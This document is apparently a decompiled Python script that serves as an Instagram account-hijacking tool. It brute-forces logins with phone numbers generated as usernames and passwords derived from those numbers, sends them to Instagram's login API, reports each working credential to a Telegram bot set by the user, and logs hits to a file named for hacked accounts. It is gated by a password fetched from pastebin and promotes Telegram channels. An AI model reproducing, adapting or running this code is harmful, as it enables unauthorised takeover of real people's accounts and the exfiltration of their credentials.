# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.0 (default, Dec  5 2019, 10:18:50) 
# [Clang 8.0.7 (https://android.googlesource.com/toolchain/clang b55f2d4ebfd35bf6
# Embedded file name: string
import os, sys, requests
almheb = requests.get('https://pastebin.com/T3yzYFaW')
#V1
password = input('          TOOL PASSWORD: ')
if password == '':
    sys.exit()
elif password in str(almheb.text):
    print(' FIRST STEP Is Done. Logged in Successfully as ')
    print('Please Wait 5 Minutes, All Packages Are Checking.....')
else:
    print(' Wrong Password !')
    sys.exit()
os.system('clear')
import os, os, random, uuid, requests, string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
os.system('title  #TTH Was Here - @B_o0_1')
clear = lambda : os.system('cls')
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()

try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
else:
    try:
        import random
    except ImportError:
        os.system('pip install random')
        import random
        clear()
    else:
        color3 = fg(2)
        color4 = fg('9')

        def close():
            input('- Press Enter To Exit /')
            sys.exit()


        clear()
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser, os, sys, requests
        webbrowser.open('https://t.me/MHRTEAM')
        P = '\x1b[2;35m'
        J = '\x1b[1;31m'
        I = '\x1b[2;36m'
        H = '\x1b[2;35m'
        A = '\x1b[2;36m'
        E = '\x1b[1;31m'
        Z = '\x1b[2;31m'
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        webbrowser.open('https://t.me/B_o0_11')
        import user_agent, random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        import pyfiglet, webbrowser
        sleep(1)
        sleep(1)
        os.system('clear')
        aa = 0
        zz = 0
        ib = 0
        print('\n')
        sleep(2)
        os.system('clear')
        sleep(2)
        bnar = 'حمودي @B_o0_1'
        print(G + bnar)
        sleep(1)
        ID = input(G + '  ID telegram  : ')
        sleep(1)
        tok = input(G + '  TOKEN Telegram : ')
        w = 'https://pastebin.com/ffSsxVjK'
        #MT
        start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=✰︎ اداه حمودي لصيد الحسابات 👨\u200d💻 ✰︎").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'MT' in rss:
            sleep(0.1)
            r = requests.Session()
            user = '0987653321'
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                username = '+20120' + us
                password = '0120' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝙽𝚎𝚠 تم صيد حساب انستا جديد من اداه عمك حمودي✅ ᵾᎦЄℝ ₦ᗩᗰЄ : {username}\n 𝑷𝐠 ꝒΔṥṨᎧฟ℟ⅅ : {password}\n- BY : @B_o0_1 - @MHRTEAM"
                    i = requests.post(tlg)
                    with open('INsTA V2.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    ib += 1
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= ✰︎ يتم الفحص ♥حمودي♥ 𝑻𝑻𝑯 👨\u200d💻 ✰︎\n-----------------------------------------\n.✥. Δ₡₡😂 %💯 : {zz}\n.✥. ₦Φ₮Δ๔ℂ❌ : {aa}\n.✥. ℬ₳ͷⅅ ⚠️ : {ib}\n-----------------------------------------\n.✥. ᎯᏨᏨ ᶳͲᗩℝͲ ₡ℋΞΔ₡Ꝅ 👇 🔥 : {aa}\n-----------------------------------------\n.✥. ᵿᎦΞℛ₦ΔᵯЄ 📧 :  [→{username}←]\n.✥. Ꝓ₳ᵴᵴᏯỖ℟ⅅ📧 :  [→{password}←]\n-----------------------------------------\n .✥.CH : @MHRTEAM ℬΨ : @B_o0_1 ")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

        else:
            print(Z + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
